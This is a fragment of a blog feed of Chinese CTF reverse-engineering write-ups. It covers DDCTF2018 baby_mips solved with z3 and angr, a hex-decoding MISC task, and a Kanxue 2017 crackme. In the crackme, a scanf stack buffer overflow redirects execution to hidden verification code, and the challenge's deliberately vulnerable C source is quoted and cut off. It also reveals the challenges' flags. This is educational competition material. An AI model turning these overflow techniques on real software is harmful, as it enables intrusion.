-0x4b88*a[15] == 0xd08e2)</span><br><span class="line">s.add(0xffff1bae*a[0] -0xc7d4*a[1] -0x1554*a[2] +0x7eea*a[3] -0x684d*a[4] +0x6adb*a[5] +0x8534*a[6] -0x3a36*a[7] +0x29f0*a[8] +0xd3f2*a[9] -0x23e5*a[10] -0x6540*a[11] +0xbcd3*a[12] -0xef9b*a[13] +0xefdb*a[14] -0x774e*a[15] == 0x178803)</span><br><span class="line"></span><br><span class="line">for item in a:</span><br><span class="line">    s.add(item &gt; 0, item &lt; 127)</span><br><span class="line"></span><br><span class="line">if s.check() == sat:</span><br><span class="line">    m = s.model()</span><br><span class="line">    flag = []</span><br><span class="line">    for i in xrange(16):</span><br><span class="line">        flag.append(m[a[i]].as_long())</span><br><span class="line">    print &apos;&apos;.join(map(chr, flag))</span><br></pre></td></tr></table></figure><h3 id="angr二进制自动化分析及符号执行"><a href="#angr二进制自动化分析及符号执行" class="headerlink" title="angr二进制自动化分析及符号执行"></a>angr二进制自动化分析及符号执行</h3><p>angr是一个基于python的二进制漏洞分析框架，集成了多种主流的分析技术，能够进行动态的符号执行分析和多种静态分析。</p><p>如果我们使用angr的话，就不再需要考虑算法内部的详细原理，利用符号执行可以大大减少分析时间</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.text:00403620                 lw      $gp, 0x98+var_50($fp)</span><br><span class="line">.text:00403624                 addiu   $v0, $fp, 0x98+var_48</span><br><span class="line">.text:00403628                 move    $a0, $v0</span><br><span class="line">.text:0040362C                 jal     sub_400420</span><br><span class="line">.text:00403630                 nop</span><br><span class="line">.text:00403634                 lw      $gp, 0x98+var_50($fp)</span><br><span class="line">.text:00403638                 beqz    $v0, loc_4036E4</span><br><span class="line">.text:0040363C                 nop</span><br></pre></td></tr></table></figure><p>通过静态分析可知，程序在0x40362c处调用sub_400420函数，其参数通过寄存器a0传递，然后返回值保存在v0寄存器中。之后对v0的内容进行判断，如果为1则输出flag(flag与用户输入的内容相关)，为0则输出”Wrong”。因此，只需要求解输入，保证sub_400420的返回值为1即可。</p><p>angr脚本<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"></span><br><span class="line">import angr</span><br><span class="line"></span><br><span class="line">project = angr.Project(&apos;./patch&apos;, load_options=&#123;&apos;auto_load_libs&apos;:False&#125;)</span><br><span class="line"></span><br><span class="line">start_address = 0x400420</span><br><span class="line">memory_address = 0x10000000</span><br><span class="line"></span><br><span class="line">find_address = 0x4031F0</span><br><span class="line">avoid_address = (0x4019E4, 0x401b7c,0x401D18, 0x401EB0, 0x40204C, 0x4021E4, 0x40237C, 0x402518, 0x4026B4, 0x40284C, 0x4029E4, 0x402B7C, 0x402D14, 0x402EB0, 0x403048, 0x4031E0)</span><br><span class="line"></span><br><span class="line">state = project.factory.blank_state(addr=start_address)</span><br><span class="line"></span><br><span class="line">for i in xrange(16):</span><br><span class="line">    state.memory.store(memory_address+i*4, state.solver.BVS(&apos;a%d&apos; % i, 32), endness=state.arch.memory_endness)</span><br><span class="line"></span><br><span class="line">state.regs.a0 = memory_address</span><br><span class="line"></span><br><span class="line"># add LAZY_SOLVES to speed up</span><br><span class="line">simgr = project.factory.simulation_manager(state, add_options=&#123;angr.options.LAZY_SOLVES&#125;)</span><br><span class="line"></span><br><span class="line">simgr.explore(find=find_address, avoid=avoid_address)</span><br><span class="line"></span><br><span class="line">if simgr.found:</span><br><span class="line">    find_state = simgr.found[0]</span><br><span class="line"></span><br><span class="line">    # add constraints to reduce the keyspace</span><br><span class="line">    for i in xrange(16):</span><br><span class="line">        value = find_state.memory.load(memory_address+i*4,4, endness=find_state.arch.memory_endness)</span><br><span class="line">        find_state.add_constraints(value &gt; 0, value &lt; 127)</span><br><span class="line"></span><br><span class="line">    flag = [find_state.se.eval(find_state.memory.load(memory_address+i*4, 4, endness=find_state.arch.memory_endness)) for i in xrange(16)]</span><br><span class="line">    print &apos;&apos;.join(map(chr,flag))</span><br></pre></td></tr></table></figure></p><p>返回1的地址<br><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180515/e5fLFD8Bih.png?imageslim" alt="mark"></p><p><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180515/D44e8jkEkg.png?imageslim" alt="mark"><br>find_address是使得函数sub_400420返回值为1的地址，而avoid_address是使得函数sub_400420返回值为0的地址。同时，将输入的16个数字保存在内存地址0x10000000处，然后将其赋值给a0寄存器，实现参数的传递。之后，直接从函数sub_400420的开始处开始分析。</p><hr><p>第二种</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line">from angr import *</span><br><span class="line">import logging</span><br><span class="line">import IPython</span><br><span class="line">logging.getLogger(&apos;angr.manager&apos;).setLevel(logging.DEBUG)</span><br><span class="line">p = Project(&apos;baby_mips&apos;)</span><br><span class="line">state = p.factory.blank_state(addr=0x400420)</span><br><span class="line">DATA_ADDR = 0xA0000</span><br><span class="line">state.regs.a0 = DATA_ADDR</span><br><span class="line">for i in range(16*4):</span><br><span class="line">    vec = state.solver.BVS(&quot;c&#123;&#125;&quot;.format(i),8,explicit_name=True)</span><br><span class="line">    cond = state.solver.And(vec&gt;=32,vec&lt;=126) # low byte</span><br><span class="line">    state.memory.store(DATA_ADDR+i,vec)</span><br><span class="line">    if i % 4 == 0:</span><br><span class="line">        pass</span><br><span class="line">    #state.add_constraints(cond)</span><br><span class="line">sm = p.factory.simulation_manager(state)</span><br><span class="line">res = sm.explore(find=0x4031F0,avoid=[0x4019E4, 0x401b7c,0x401D18, 0x401EB0, 0x40204C, 0x4021E4, 0x40237C, 0x402518, 0x4026B4, 0x40284C, 0x4029E4, 0x402B7C, 0x402D14, 0x402EB0, 0x403048, 0x4031E0])</span><br><span class="line"></span><br><span class="line">found = res.found[0]</span><br><span class="line">mem = found.memory.load(DATA_ADDR,16*4)</span><br><span class="line">print found.solver.eval(mem)</span><br><span class="line">print &apos;##########################################&apos;</span><br><span class="line">flag = &apos;&apos;</span><br><span class="line">for i in range(16):</span><br><span class="line">    v = found.memory.load(DATA_ADDR + 4*i,1)</span><br><span class="line">    flag = flag + found.solver.eval(v,cast_to=str)</span><br><span class="line">print flag  #7fe2c58fc9a7eb90</span><br></pre></td></tr></table></figure><p><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180515/Cc8G2BjBJj.png?imageslim" alt="mark"></p><p>flag每个人都是不一样的，我的用angr解的话，最后得到的是7fe2c58fc9a7eb90</p><h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><p>于是flag: DDCTF{7fe2c58fc9a7eb90}</p><p>z3解的话还可以得出具体每个变量的值，这里就不放图了</p><p>From <a href="https://kabeor.github.io/DDCTF2018 Reverse writeup(1">https://kabeor.github.io/DDCTF2018 Reverse writeup(1) baby_mips/</a> baby_mips/) bye</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;DDCTF2018-Reverse-writeup&quot;&gt;&lt;a href=&quot;#DDCTF2018-Reverse-writeup&quot; class=&quot;headerlink&quot; title=&quot;DDCTF2018 Reverse writeup&quot;&gt;&lt;/a&gt;DDCTF2018 R
      
    
    </summary>
    
      <category term="逆向" scheme="https://kabeor.github.io/categories/%E9%80%86%E5%90%91/"/>
    
    
      <category term="writeup" scheme="https://kabeor.github.io/tags/writeup/"/>
    
      <category term="DDCTF2018" scheme="https://kabeor.github.io/tags/DDCTF2018/"/>
    
      <category term="Reverse" scheme="https://kabeor.github.io/tags/Reverse/"/>
    
  </entry>
  
  <entry>
    <title>DDCTF2018 MISC writeup</title>
    <link href="https://kabeor.github.io/DDCTF2018%20MISC%20writeup/"/>
    <id>https://kabeor.github.io/DDCTF2018 MISC writeup/</id>
    <published>2018-05-03T13:33:30.217Z</published>
    <updated>2018-06-07T11:11:49.491Z</updated>
    
    <content type="html"><![CDATA[<h1 id="DDCTF2018-MISC-writeup"><a href="#DDCTF2018-MISC-writeup" class="headerlink" title="DDCTF2018 MISC writeup"></a>DDCTF2018 MISC writeup</h1><h2 id="1-签到题"><a href="#1-签到题" class="headerlink" title="1.签到题"></a>1.签到题</h2><h2 id="2-╯°□°）╯︵-┻━┻"><a href="#2-╯°□°）╯︵-┻━┻" class="headerlink" title="2.(╯°□°）╯︵ ┻━┻"></a>2.(╯°□°）╯︵ ┻━┻</h2><p>给了一段编码</p><blockquote><p> d4e8e1f4a0f7e1f3a0e6e1f3f4a1a0d4e8e5a0e6ece1e7a0e9f3baa0c4c4c3d4c6fbb9b2b2e1e2b9b9b7b4e1b4b7e3e4b3b2b2e3e6b4b3e2b5b0b6b1b0e6e1e5e1b5fd</p></blockquote><p>可以看到这串字符只有数字和字母a-f，所以猜测应该是16进制。可以用异或的条件来判断一下，如果与ascii码异或以后得到的是正确的字符的话，异或的结果将不会是乱码。</p><p>思路感觉还是靠经验吧，各种各样的方法，不过总体来说是用<strong>移位爆破</strong>出来的</p><p>下面是两种解题脚本<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">s=&quot;d4 e8 e1 f4 a0 f7 e1 f3 a0 e6 e1 f3 f4 a1 a0 d4 e8 e5 a0 e6 ec e1 e7 a0 e9 f3 ba a0 c4 c4 c3 d4 c6 fb b7 b9 b8 e4 b5 b5 e4 e2 b7 b6 b5 b5 b2 e1 b9 b2 b2 e4 b0 b0 e4 b7 b7 b5 e5 b3 b3 b1 b1 b9 b0 b7 fd&quot;</span><br><span class="line">s=s.split()</span><br><span class="line">for key in range(0,128+1,1):</span><br><span class="line">    for i in s:</span><br><span class="line">        i = int(i,16)</span><br><span class="line">        print (chr((i + key + 256) % 256 ), end = &apos;&apos;)</span><br><span class="line">    print (key)</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">data=bytearray.fromhex(&apos;d4e8e1f4a0f7e1f3a0e6e1f3f4a1a0d4e8e5a0e6ece1e7a0e9f3baa0c4c4c3d4c6fbb9e1e6b3e3b9e4b3b7b7e2b6b1e4b2b6b9e2b1b1b3b3b7e6b3b3b0e3b9b3b5e6fd&apos;)</span><br><span class="line">flag = &apos;&apos;</span><br><span class="line">for i in data:</span><br><span class="line">    flag = flag + chr(i &amp; 0x7f)</span><br><span class="line">print flag</span><br></pre></td></tr></table></figure><p>最后得出flag</p><blockquote><p>That was fast! The flag is: DDCTF{798d55db76552a922d00d775e3311907}</p></blockquote><p>## </p><p>待补充</p><p>From <a href="https://kabeor.github.io/DDCTF2018 MISC writeup/">https://kabeor.github.io/DDCTF2018 MISC writeup/</a> bye</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;DDCTF2018-MISC-writeup&quot;&gt;&lt;a href=&quot;#DDCTF2018-MISC-writeup&quot; class=&quot;headerlink&quot; title=&quot;DDCTF2018 MISC writeup&quot;&gt;&lt;/a&gt;DDCTF2018 MISC write
      
    
    </summary>
    
      <category term="逆向" scheme="https://kabeor.github.io/categories/%E9%80%86%E5%90%91/"/>
    
    
      <category term="writeup" scheme="https://kabeor.github.io/tags/writeup/"/>
    
      <category term="DDCTF2018" scheme="https://kabeor.github.io/tags/DDCTF2018/"/>
    
      <category term="MISC" scheme="https://kabeor.github.io/tags/MISC/"/>
    
  </entry>
  
  <entry>
    <title>看雪.TSRC 2017CTF秋季赛 ctf2017_Fpc</title>
    <link href="https://kabeor.github.io/%E7%9C%8B%E9%9B%AA.TSRC%202017CTF%E7%A7%8B%E5%AD%A3%E8%B5%9B%20ctf2017_Fpc/"/>
    <id>https://kabeor.github.io/看雪.TSRC 2017CTF秋季赛 ctf2017_Fpc/</id>
    <published>2018-04-26T15:13:56.689Z</published>
    <updated>2018-06-07T11:12:09.253Z</updated>
    
    <content type="html"><![CDATA[<h1 id="看雪-TSRC-2017CTF秋季赛-ctf2017-Fpc"><a href="#看雪-TSRC-2017CTF秋季赛-ctf2017-Fpc" class="headerlink" title="看雪.TSRC 2017CTF秋季赛 ctf2017_Fpc"></a>看雪.TSRC 2017CTF秋季赛 ctf2017_Fpc</h1><blockquote><p>自己做再加上分析别人的wp搞了一星期，这道题终于分析透彻了，感觉自己提升了很多。<br>从这道题中学到的新知识有：</p><ol><li>scanf函数的缓冲区溢出漏洞</li><li>RUN跟踪去除花指令</li><li>Z3约束求解器的使用</li></ol></blockquote><h2 id="基本工作"><a href="#基本工作" class="headerlink" title="基本工作"></a>基本工作</h2><p>无壳的exe</p><p>运行一下<br><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180427/iGC0663lmd.png?imageslim" alt="mark"></p><p>搜索字符串<br><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180427/a6GIAl1LF6.png?imageslim" alt="mark"><br>进入Please input your code<br>运行后在输入字符串位置断下<br><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180427/DHLIhJ7EL6.png?imageslim" alt="mark"><br>所以接下来就是算法分析了</p><h2 id="结构分析"><a href="#结构分析" class="headerlink" title="结构分析"></a>结构分析</h2><p>IDA载入，找到主函数<br><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180427/1CeFk9iDc4.png?imageslim" alt="mark"></p><blockquote><p>main函数内部</p></blockquote><p><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180427/339jGclld2.png?imageslim" alt="mark"></p><p>dword_41B034的初值为2</p><p>可以看到判断是否成功前调用了三个call 401050，401090和4010E0<br>其中401050为打印题目并调用    <code>scanf()</code>    <strong>(注意，这很重要，后面有解释)</strong></p><p>后两个看来就是解密函数了，分析一下</p><blockquote><p>sub_401090</p></blockquote><p><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180427/Eel9BeL0LJ.png?imageslim" alt="mark"><br><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180427/l6lk3kkg6I.png?imageslim" alt="mark"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.text:00401090 ; =============== S U B R O U T I N E =======================================</span><br><span class="line">.text:00401090</span><br><span class="line">.text:00401090 ; Attributes: bp-based frame</span><br><span class="line">.text:00401090</span><br><span class="line">.text:00401090 sub_401090      proc near               ; CODE XREF: _main+1Cp</span><br><span class="line">.text:00401090</span><br><span class="line">.text:00401090 var_C           = dword ptr -0Ch</span><br><span class="line">.text:00401090 var_8           = dword ptr -8</span><br><span class="line">.text:00401090 var_4           = dword ptr -4</span><br><span class="line">.text:00401090</span><br><span class="line">.text:00401090                 push    ebp</span><br><span class="line">.text:00401091                 mov     ebp, esp</span><br><span class="line">.text:00401093                 mov     ecx, [ebp+var_4]</span><br><span class="line">.text:00401096                 test    ecx, ecx</span><br><span class="line">.text:00401098                 jz      short loc_4010D7</span><br><span class="line">.text:0040109A                 mov     edx, [ebp+var_8]</span><br><span class="line">.text:0040109D                 test    edx, edx</span><br><span class="line">.text:0040109F                 jz      short loc_4010D7</span><br><span class="line">.text:004010A1                 mov     eax, ecx</span><br><span class="line">.text:004010A3                 sub     eax, edx</span><br><span class="line">.text:004010A5                 jz      short loc_4010D7</span><br><span class="line">.text:004010A7                 mov     [ebp+var_C], eax</span><br><span class="line">.text:004010AA                 imul    eax, 5</span><br><span class="line">.text:004010AD                 add     ecx, eax</span><br><span class="line">.text:004010AF                 cmp     ecx, 8F503A42h</span><br><span class="line">.text:004010B5                 jnz     short loc_4010D7</span><br><span class="line">.text:004010B7                 mov     eax, [ebp+var_C]</span><br><span class="line">.text:004010BA                 imul    eax, 0Dh</span><br><span class="line">.text:004010BD                 add     edx, eax</span><br><span class="line">.text:004010BF                 cmp     edx, 0EF503A42h</span><br><span class="line">.text:004010C5                 jnz     short loc_4010D7</span><br><span class="line">.text:004010C7                 mov     edx, 543F30h</span><br><span class="line">.text:004010CC                 xor     edx, 158F04h</span><br><span class="line">.text:004010D2                 mov     eax, [edx]</span><br><span class="line">.text:004010D4                 dec     eax</span><br><span class="line">.text:004010D5                 mov     [edx], eax</span><br><span class="line">.text:004010D7</span><br><span class="line">.text:004010D7 loc_4010D7:                             ; CODE XREF: sub_401090+8j</span><br><span class="line">.text:004010D7                                         ; sub_401090+Fj ...</span><br><span class="line">.text:004010D7                 mov     esp, ebp</span><br><span class="line">.text:004010D9                 pop     ebp</span><br><span class="line">.text:004010DA                 retn</span><br><span class="line">.text:004010DA sub_401090      endp</span><br><span class="line">.text:004010DA</span><br><span class="line">.text:004010DA ; </span><br><span class="line"></span><br><span class="line">---------------------------------------------------------------------------</span><br></pre></td></tr></table></figure><p><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180427/9jh52j2bki.png?imageslim" alt="mark"></p><p>方程</p><blockquote><p>x!=0<br>y!=0<br>x!=y<br>5(y-x)+y=0x8F503A42<br>13(y-x)+x=0xEF503A42</p><p>sub_4010E0<br><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180427/lGkFCmjbfm.png?imageslim" alt="mark"><br><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180427/Ka6KfAa2Hl.png?imageslim" alt="mark"></p></blockquote><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.text:004010E0 ; =============== S U B R O U T I N E =======================================</span><br><span class="line">.text:004010E0</span><br><span class="line">.text:004010E0 ; Attributes: bp-based frame</span><br><span class="line">.text:004010E0</span><br><span class="line">.text:004010E0 sub_4010E0      proc near               ; CODE XREF: _main+21p</span><br><span class="line">.text:004010E0</span><br><span class="line">.text:004010E0 var_C           = dword ptr -0Ch</span><br><span class="line">.text:004010E0 var_8           = dword ptr -8</span><br><span class="line">.text:004010E0 var_4           = dword ptr -4</span><br><span class="line">.text:004010E0</span><br><span class="line">.text:004010E0                 push    ebp</span><br><span class="line">.text:004010E1                 mov     ebp, esp</span><br><span class="line">.text:004010E3                 mov     ecx, [ebp+var_4]</span><br><span class="line">.text:004010E6                 test    ecx, ecx</span><br><span class="line">.text:004010E8                 jz      short loc_401127</span><br><span class="line">.text:004010EA                 mov     edx, [ebp+var_8]</span><br><span class="line">.text:004010ED                 test    edx, edx</span><br><span class="line">.text:004010EF                 jz      short loc_401127</span><br><span class="line">.text:004010F1                 mov     eax, ecx</span><br><span class="line">.text:004010F3                 sub     eax, edx</span><br><span class="line">.text:004010F5                 jz      short loc_401127</span><br><span class="line">.text:004010F7                 mov     [ebp+var_C], eax</span><br><span class="line">.text:004010FA                 imul    eax, 11h</span><br><span class="line">.text:004010FD                 add     ecx, eax</span><br><span class="line">.text:004010FF                 cmp     ecx, 0F3A94883h</span><br><span class="line">.text:00401105                 jnz     short loc_401127</span><br><span class="line">.text:00401107                 mov     eax, [ebp+var_C]</span><br><span class="line">.text:0040110A                 imul    eax, 7</span><br><span class="line">.text:0040110D                 add     edx, eax</span><br><span class="line">.text:0040110F                 cmp     edx, 33A94883h</span><br><span class="line">.text:00401115                 jnz     short loc_401127</span><br><span class="line">.text:00401117                 mov     edx, 543F30h</span><br><span class="line">.text:0040111C                 xor     edx, 158F04h</span><br><span class="line">.text:00401122                 mov     eax, [edx]</span><br><span class="line">.text:00401124                 dec     eax</span><br><span class="line">.text:00401125                 mov     [edx], eax</span><br><span class="line">.text:00401127</span><br><span class="line">.text:00401127 loc_401127:                             ; CODE XREF: sub_4010E0+8j</span><br><span class="line">.text:00401127                                         ; sub_4010E0+Fj ...</span><br><span class="line">.text:00401127                 mov     esp, ebp</span><br><span class="line">.text:00401129                 pop     ebp</span><br><span class="line">.text:0040112A                 retn</span><br><span class="line">.text:0040112A sub_4010E0      endp</span><br><span class="line">.text:0040112A</span><br><span class="line">.text:0040112A ; </span><br><span class="line"></span><br><span class="line">---------------------------------------------------------------------------</span><br></pre></td></tr></table></figure><p><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180427/bKejh8lJ8l.png?imageslim" alt="mark"></p><p>方程</p><blockquote><p>x!=0<br>y!=0<br>x!=y<br>17(y-x)+y=0xF3A94883<br>7(y-x)+x=0x33A94883</p></blockquote><p>这两个函数的方程要满足唯一解很难，并且也不是出题人本意，据说有人解了一天没解出来</p><h2 id="更换思路"><a href="#更换思路" class="headerlink" title="更换思路"></a>更换思路</h2><p>我们再回到主函数分析，再次看到这个scanf(),并且往后翻有大量未识别的数据，从00413131开始<br><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180427/9DcG4I9c8K.png?imageslim" alt="mark"></p><p>于是我们可以考虑一下<strong>缓冲区溢出</strong></p><p><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180427/fAc3d2AcL9.png?imageslim" alt="mark"></p><p><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180427/gIDL67fbKm.png?imageslim" alt="mark"><br><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180427/0iDcL11a52.png?imageslim" alt="mark"></p><p>可以看到，我们输入信息一开始保存在0012FF2C,栈清空后保存在0012FF3C，于是十六进制下3C-2C=10，也就是十进制下的16。<strong>因此如果要覆盖返回地址需要构造12字节的信息外加4个字节的返回地址。</strong><br>我们事实上可以直接覆盖到You get it的地址，因为比赛限制flag只为字母和数字，因此需要另想其他办法</p><p>在IDA中往下翻翻，看到有一大串未识别的数据，于是猜想有可能应该溢出到这里<br><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180501/lgiL75B1LK.png?imageslim" alt="mark"><br>首地址为00413131<br>转换成ASCII为A11<br>因为数据在内存中为小段排序，于是应该转换为11A<br>所以我们可以使用测试数据1234567890ab11A来溢出到那段数据</p><p>成功跳入，然后右键分析-&gt;从模块中删除分析识别出正确代码。<br>看到一堆跳转<br><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180501/53D6GAmGm2.png?imageslim" alt="mark"></p><p>这里是花指令了</p><h3 id="使用RUN跟踪去除花指令"><a href="#使用RUN跟踪去除花指令" class="headerlink" title="使用RUN跟踪去除花指令"></a>使用RUN跟踪去除花指令</h3><p>断在0x413131处后, 点击菜单栏的”查看”, 选择”RUN跟踪”, 然后再点击”调试”, 选择”跟踪步入”, 程序会记录这段花指令执行的过程<br><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180501/AHmkl70GIG.png?imageslim" alt="mark"></p><p>我觉得应该是把最后一栏显示寄存器的指令提取出来<br>但目前程序显示错误<br><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180501/1cii0f2jgm.png?imageslim" alt="mark"><br>所以先从前向后记录这些有用指令，然后在下面发现一个奇怪的跳转<br><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180501/EkAd3jE8KH.png?imageslim" alt="mark"><br>这个跳转后面没有short，也不显示寄存器，而且显然跳转之后导致了错误，因此我们把这里的跳转改掉或下断点修改标志位，重新跟踪<br>然后还有两个jnz<br><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180501/F0i2lCdJ4H.png?imageslim" alt="mark"><br><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180501/4k1H6JFJib.png?imageslim" alt="mark"></p><p>最后一个跳转修改完，跟踪会抛出一个异常<br><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180501/l3faBhK4Kg.png?imageslim" alt="mark"></p><p>我们提取这之前的有效代码,一共三段验证<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vaild_1:</span><br><span class="line">00413131    83C4 F0         add esp,-0x10</span><br><span class="line">00413150    33C0            xor eax,eax</span><br><span class="line">00413184    A3 34B04100     mov dword ptr ds:[0x41B034],eax</span><br><span class="line">004131BA    58              pop eax</span><br><span class="line">004131EB    8BC8            mov ecx,eax                            </span><br><span class="line">0041321F    58              pop eax</span><br><span class="line">00413254    8BD8            mov ebx,eax                </span><br><span class="line">00413289    58              pop eax</span><br><span class="line">004132B5    8BD0            mov edx,eax                    </span><br><span class="line">004132AD    8BD0            mov edx,eax</span><br><span class="line">004132E2    8BC1            mov eax,ecx</span><br><span class="line">00413316    2BC3            sub eax,ebx                </span><br><span class="line">00413349    C1E0 02         shl eax,0x2</span><br><span class="line">00413380    03C1            add eax,ecx</span><br><span class="line">004133B5    03C2            add eax,edx</span><br><span class="line">004133E9    2D E217F9EA     sub eax,0xEAF917E2</span><br><span class="line">00413420   /0F85 DD060000   jnz ctf2017_.00413B03</span><br><span class="line"> </span><br><span class="line">vaild_2:                   </span><br><span class="line">00413455    03C1            add eax,ecx                                </span><br><span class="line">00413489    2BC3            sub eax,ebx                </span><br><span class="line">004134BF    8BD8            mov ebx,eax                </span><br><span class="line">004134F3    D1E0            shl eax,1                      </span><br><span class="line">00413525    03C3            add eax,ebx                </span><br><span class="line">00413559    03C1            add eax,ecx                </span><br><span class="line">0041358F    8BC8            mov ecx,eax                </span><br><span class="line">004135C3    03C2            add eax,edx                </span><br><span class="line">004135F7    2D C808F5E8     sub eax,0xE8F508C8</span><br><span class="line">0041362E   /0F85 CF040000   jnz ctf2017_.00413B03</span><br><span class="line"> </span><br><span class="line">vaild_3</span><br><span class="line">00413665    8BC1            mov eax,ecx                </span><br><span class="line">0041365D    8BC1            mov eax,ecx</span><br><span class="line">004136A7    2BC2            sub eax,edx                </span><br><span class="line">004136D8    2D 683C0A0C     sub eax,0xC0A3C68</span><br><span class="line">00413703   /75 04           jnz short ctf2017_.00413709</span><br></pre></td></tr></table></figure></p><p>整理得到三个方程组</p><blockquote><p>((x - y) &lt;&lt; 2) + x + z == 0xEAF917E2<br>((x - y) &lt;&lt; 1) + (x - y) + x + z == 0xE8F508C8<br>((x - y) &lt;&lt; 1) + (x - y) + x - z == 0x0C0A3C68</p></blockquote><h2 id="利用z3约束求解器解方程"><a href="#利用z3约束求解器解方程" class="headerlink" title="利用z3约束求解器解方程"></a>利用z3约束求解器解方程</h2><p>Z3 is a theorem prover from Microsoft Research.<br>相关介绍和安装方法：  <a href="https://github.com/Z3Prover/z3" target="_blank" rel="noopener">https://github.com/Z3Prover/z3</a></p><p>源码如下<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># coding=utf-8</span><br><span class="line">from z3 import *</span><br><span class="line">x, y ,z = BitVecs(&apos;x y z&apos;, 64)</span><br><span class="line">#x = Real(&apos;x&apos;)</span><br><span class="line">#y = Real(&apos;y&apos;)</span><br><span class="line">#z = Real(&apos;z&apos;)</span><br><span class="line">solve(((x - y) &lt;&lt; 2) + x + z == 0xEAF917E2,((x - y) &lt;&lt; 1) + (x - y) + x + z == 0xE8F508C8,((x - y) &lt;&lt; 1) + (x - y) + x - z == 0x0C0A3C68)</span><br></pre></td></tr></table></figure></p><p>运行后得到结果<br><code>[z = 1853187632, y = 1919903280, x = 1953723722]</code><br>转换为16进制<br>x = 0x7473754a<br>y = 0x726f6630<br>z = 0x6e756630</p><p>连起来转换为字符串<br><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180501/iHfideeJKD.png?imageslim" alt="mark"><br>倒过来就是Just0for0fun<br>再加上溢出要用的11A<br>所以<br>flag=Just0for0fun11A</p><p><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180501/Li1DhIE2Ef.png?imageslim" alt="mark"></p><h2 id="题目源码"><a href="#题目源码" class="headerlink" title="题目源码"></a>题目源码</h2><p><a href="https://bbs.pediy.com/thread-222404.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-222404.htm</a></p><h3 id="主体-VC6"><a href="#主体-VC6" class="headerlink" title="主体(VC6)"></a>主体(VC6)</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &quot;stdafx.h&quot;</span><br><span class="line"> </span><br><span class="line">#ifdef __cplusplus</span><br><span class="line">extern &quot;C&quot; &#123;</span><br><span class="line">#endif</span><br><span class="line"> </span><br><span class="line">int __cdecl Add3(int, int);                                 // proc in asm obj</span><br><span class="line">char * __cdecl very2();                                     // right verify proc, in asm obj, @413131</span><br><span class="line"> </span><br><span class="line">#ifdef __cplusplus</span><br><span class="line">&#125; /* extern &quot;C&quot; */</span><br><span class="line">#endif</span><br><span class="line"> </span><br><span class="line">inline void G()&#123; printf(&quot;You get it!\n&quot;);&#125;                  // show good msg, will not have a chance to run</span><br><span class="line">inline void B()&#123; printf(&quot;Bad register-code, keep trying.\n&quot;);&#125;  // show err msg</span><br><span class="line"> </span><br><span class="line">char * InputKey();                                          // get register code, in stack</span><br><span class="line">void very1();                                               // fake verify proc 1</span><br><span class="line">void very3();                                               // fake verify proc 3</span><br><span class="line">int Flag=0x21;                                              // register flag, 21 is a bad-guy</span><br><span class="line">extern &quot;C&quot; int cFlag=0x11;                                  // anti-wrong jump flag</span><br><span class="line"> </span><br><span class="line">&lt;br&gt;</span><br><span class="line">int main(int argc, char* argv[])</span><br><span class="line">&#123;</span><br><span class="line">    printf(&quot;\n Crackme for CTF2017 @Pediy.\n&quot;);             // show welcome msg</span><br><span class="line">    char Key0[10];                                          // local var, never use</span><br><span class="line">    char *p1;                                               // pointor to stack var, useless</span><br><span class="line">    cFlag=2;</span><br><span class="line">    p1=InputKey();                                          // get register code, it must over-flow to very2()</span><br><span class="line">    //printf(&quot;%s\n&quot;, p1);</span><br><span class="line">    very1();                                                // useless</span><br><span class="line">    very3();                                                // useless</span><br><span class="line">    if(cFlag==0)</span><br><span class="line">        G();</span><br><span class="line">    else</span><br><span class="line">        B();                                        // boom! bad cracker, just wonder where to verify it???</span><br><span class="line">    //getch();</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">char * InputKey()                                           // get register code, it must over-flow to very2(), which is coded in ASM, with junk-code</span><br><span class="line">                                                            // dword1 dword2 dword3 11A (address of very2, @413131 )</span><br><span class="line">&#123;</span><br><span class="line">    char Key[10];</span><br><span class="line">    char *p2;</span><br><span class="line">    p2=(char *)&amp;Key;</span><br><span class="line">    printf(&quot; Coded by 